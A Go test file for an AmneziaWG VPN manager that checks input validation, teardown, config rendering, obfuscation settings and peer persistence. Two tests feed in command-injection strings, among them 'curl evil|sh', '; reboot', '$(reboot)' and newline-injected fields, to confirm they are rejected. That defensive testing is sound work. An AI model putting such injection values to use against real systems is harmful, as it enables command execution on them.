package awg

import (
	"context"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
)

func newEnableManager(t *testing.T, f *fakeRunner) *Manager {
	t.Helper()
	dir := t.TempDir()
	sys := filepath.Join(dir, "sys") // fake /sys/class/net with ens3
	os.MkdirAll(filepath.Join(sys, "ens3"), 0755)
	m := newTestManager(t, f)
	m.confPath = filepath.Join(dir, "amneziawg", "awg-rb0.conf")
	m.store = NewStore(filepath.Join(dir, "amneziawg", "peers.toml"))
	m.module = NewModuleManager(f, writeOSRelease(t, "ubuntu"))
	m.sysClassNet = sys
	// module already loaded so Ensure short-circuits to ready.
	f.outputs["lsmod "] = "amneziawg 1 0\n"
	f.outputs["awg --version"] = "v1"
	return m
}

func goodEnableInput() EnableInput {
	return EnableInput{Subnet: "10.10.0.0/24", ListenPort: 51820, MTU: 1420, DNS: []string{"1.1.1.1"}, WANIface: "ens3"}
}

// Shell metacharacters in any operator field must be rejected BEFORE anything is
// rendered or any command runs — nothing reaches awg-quick's root shell.
func TestEnableRejectsShellMetachars(t *testing.T) {
	for _, in := range []EnableInput{
		{Subnet: "10.0.0.0/24 -j ACCEPT; curl evil|sh", ListenPort: 51820, MTU: 1420, DNS: []string{"1.1.1.1"}, WANIface: "ens3"},
		{Subnet: "10.10.0.0/24", ListenPort: 51820, MTU: 1420, DNS: []string{"1.1.1.1"}, WANIface: "ens3; reboot"},
		{Subnet: "10.10.0.0/24", ListenPort: 51820, MTU: 1420, DNS: []string{"$(reboot)"}, WANIface: "ens3"},
		// Newline-injection attempts (CRLF/LF) in WAN + subnet.
		{Subnet: "10.10.0.0/24", ListenPort: 51820, MTU: 1420, DNS: []string{"1.1.1.1"}, WANIface: "ens3\nreboot"},
		{Subnet: "10.10.0.0/24\n[Peer]", ListenPort: 51820, MTU: 1420, DNS: []string{"1.1.1.1"}, WANIface: "ens3"},
	} {
		f := newFakeRunner()
		m := newEnableManager(t, f)
		if err := m.Enable(context.Background(), in); err == nil {
			t.Fatalf("Enable(%+v): want validation error", in)
		}
		if _, err := os.Stat(m.confPath); err == nil {
			t.Fatalf("Enable(%+v): .conf must NOT be rendered on validation failure", in)
		}
		for _, c := range f.calls {
			if c[0] == "systemctl" {
				t.Fatalf("Enable(%+v): must not bring iface up after a validation failure", in)
			}
		}
	}
}

// A failure at the post-up health gate must tear down fully: iface down + chains
// flushed, status not enabled and nat_orphan false.
func TestEnableFailedHealthGateTearsDown(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	// health gate reads `awg show <iface>`; make it report the iface is NOT up.
	f.errs["awg show awg-rb0"] = errFake
	if err := m.Enable(context.Background(), goodEnableInput()); err == nil {
		t.Fatal("want failure when health gate fails")
	}
	if !f.sawContains("systemctl disable --now awg-quick@awg-rb0") {
		t.Fatalf("failed enable must run teardown (disable); calls=%v", f.calls)
	}
	st := m.Status(context.Background())
	if st.Enabled || st.NATOrphan {
		t.Fatalf("after teardown: enabled=%v nat_orphan=%v; want false/false", st.Enabled, st.NATOrphan)
	}
}

func TestEnableHappyPathRendersCanonical(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	f.outputs["awg show awg-rb0"] = "interface: awg-rb0\n  listening port: 51820\n"
	f.outputs["iptables -t nat -S"] = "-N RBOX-AWG-NAT\n-N RBOX-AWG-FWD\n-N RBOX-AWG-IN\n"
	if err := m.Enable(context.Background(), goodEnableInput()); err != nil {
		t.Fatalf("Enable: %v", err)
	}
	data, _ := os.ReadFile(m.confPath)
	if !strings.Contains(string(data), "ListenPort = 51820") || !strings.Contains(string(data), "Address = 10.10.0.1") {
		t.Fatalf("server .conf not canonical:\n%s", data)
	}
	if fi, _ := os.Stat(m.confPath); fi != nil && fi.Mode().Perm() != 0600 {
		t.Fatalf("awg-rb0.conf must be 0600 post-up, got %v", fi.Mode().Perm())
	}
	st := m.Status(context.Background())
	if !st.Enabled || st.Phase != PhaseReady {
		t.Fatalf("after happy enable: enabled=%v phase=%q; want true/ready", st.Enabled, st.Phase)
	}
}

// Hostile obfuscation fields must be validated/canonicalised, not piped raw into
// the root-shell PostUp/conf. A bad H-field rejects the Enable, rendering nothing.
func TestEnableRejectsBadObfuscation(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	in := goodEnableInput()
	in.Obf = Obfuscation{H1: "5; reboot"} // not digits / lo-hi range
	if err := m.Enable(context.Background(), in); err == nil {
		t.Fatal("Enable: want error on hostile obfuscation H field")
	}
	if _, err := os.Stat(m.confPath); err == nil {
		t.Fatal("Enable: .conf must NOT be rendered when obfuscation is invalid")
	}
}

// A concurrent Enable must not double-run the orchestrator (single-flight): while
// one Enable is in flight, the other returns a busy error and renders nothing new.
func TestEnableSingleFlight(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	// Block the in-flight Enable inside Ensure-ish work by stalling the health gate.
	release := make(chan struct{})
	f.outputs["awg show awg-rb0"] = "listening port: 51820\n"
	f.outputs["iptables -t nat -S"] = "RBOX-AWG-NAT\n"
	// Claim the in-flight slot manually to simulate an active orchestrator.
	if !m.beginEnable() {
		t.Fatal("beginEnable: first claim must succeed")
	}
	var wg sync.WaitGroup
	wg.Add(1)
	go func() {
		defer wg.Done()
		<-release
		m.endEnable()
	}()
	if err := m.Enable(context.Background(), goodEnableInput()); err == nil {
		t.Fatal("Enable: concurrent enable must be refused while one is in flight")
	}
	close(release)
	wg.Wait()
}

// Obfuscation from EnableInput must land in the rendered server.conf.
func TestEnableRendersObfuscation(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	f.outputs["awg show awg-rb0"] = "interface: awg-rb0\n  listening port: 51820\n"
	f.outputs["iptables -t nat -S"] = "-N RBOX-AWG-NAT\n"
	in := goodEnableInput()
	in.Obf = Obfuscation{Jc: 4, Jmin: 40, Jmax: 70, H1: "12345", H2: "23456", H3: "34567", H4: "45678"}
	if err := m.Enable(context.Background(), in); err != nil {
		t.Fatalf("Enable: %v", err)
	}
	data, _ := os.ReadFile(m.confPath)
	if !strings.Contains(string(data), "Jc = 4") || !strings.Contains(string(data), "H1 = 12345") {
		t.Fatalf("obfuscation not in server.conf:\n%s", data)
	}
}

// Duplicate or reserved (<=4) H values must be rejected before render.
func TestValidateObfRejectsDuplicateAndReservedH(t *testing.T) {
	if _, err := validateObf(Obfuscation{H1: "100", H2: "100", H3: "101", H4: "102"}); err == nil {
		t.Fatal("want error on duplicate H values")
	}
	if _, err := validateObf(Obfuscation{H1: "1", H2: "2", H3: "3", H4: "4"}); err == nil {
		t.Fatal("want error on reserved H values (<=4)")
	}
}

// ConfigDirty: enabled + saved config matches running -> clean; change a
// restart-affecting field (port) -> dirty.
func TestConfigDirty(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	f.outputs["awg show awg-rb0"] = "interface: awg-rb0\n  listening port: 51820\n"
	f.outputs["iptables -t nat -S"] = "-N RBOX-AWG-NAT\n"
	desired := goodEnableInput()
	m.desired = func() EnableInput { return desired }
	if err := m.Enable(context.Background(), desired); err != nil {
		t.Fatalf("Enable: %v", err)
	}
	if m.Status(context.Background()).ConfigDirty {
		t.Fatal("freshly enabled with identical config must NOT be dirty")
	}
	desired.ListenPort = 4500 // operator changed the port in settings
	if !m.Status(context.Background()).ConfigDirty {
		t.Fatal("changed setting while enabled must be dirty")
	}
}

// After a process restart the Manager is "cold" (serverPriv/obf set only by Enable),
// so RenderClientConf 500s until re-enable. Rehydrate restores render state from the
// persisted .conf + saved settings WITHOUT touching awg-quick.
func TestRehydrateWarmsManager(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	if err := os.MkdirAll(filepath.Dir(m.confPath), 0o755); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(m.confPath, []byte("[Interface]\nPrivateKey = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEs=\nListenPort = 51820\n"), 0o600); err != nil {
		t.Fatal(err)
	}
	f.outputs["awg show awg-rb0"] = "interface: awg-rb0\n  listening port: 51820\n"
	in := goodEnableInput()
	in.Obf = Obfuscation{Jc: 4, H1: "100", H2: "200", H3: "300", H4: "400"}
	m.Rehydrate(context.Background(), in)
	if m.serverPriv == "" {
		t.Fatal("rehydrate: serverPriv not restored from conf")
	}
	if m.obf.Jc != 4 {
		t.Fatalf("rehydrate: obf not restored, got %+v", m.obf)
	}
	if !m.Status(context.Background()).Enabled {
		t.Fatal("rehydrate: enabled should be true when iface is up")
	}
}

// Cold start with no conf must not crash and must leave the server not-enabled.
func TestRehydrateNoConfNoop(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	m.Rehydrate(context.Background(), goodEnableInput())
	if m.Status(context.Background()).Enabled {
		t.Fatal("rehydrate with no conf must not mark enabled")
	}
}

// Enable must render the store's existing peers into the .conf (not nil), else the
// conf file loses every [Peer] and awg-quick brings the iface up peerless on the next
// restart/reboot. Regression for the "peers vanish from conf after Apply" bug.
func TestEnableRendersExistingPeers(t *testing.T) {
	f := newFakeRunner()
	m := newEnableManager(t, f)
	f.outputs["awg show awg-rb0"] = "interface: awg-rb0\n  listening port: 51820\n"
	f.outputs["iptables -t nat -S"] = "-N RBOX-AWG-NAT\n"
	if err := m.store.Put(Peer{
		PublicKey: "B2ukLfPDGVyI8l5lgagINx3NfZMIDq9pWGxZO4tkgwQ=",
		PrivateKey: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEs=",
		Address: "10.10.0.2/32", Name: "laptop",
	}); err != nil {
		t.Fatal(err)
	}
	if err := m.Enable(context.Background(), goodEnableInput()); err != nil {
		t.Fatalf("Enable: %v", err)
	}
	data, _ := os.ReadFile(m.confPath)
	if !strings.Contains(string(data), "B2ukLfPDGVyI8l5lgagINx3NfZMIDq9pWGxZO4tkgwQ=") || !strings.Contains(string(data), "10.10.0.2/32") {
		t.Fatalf("enable dropped existing peer from conf:\n%s", data)
	}
}
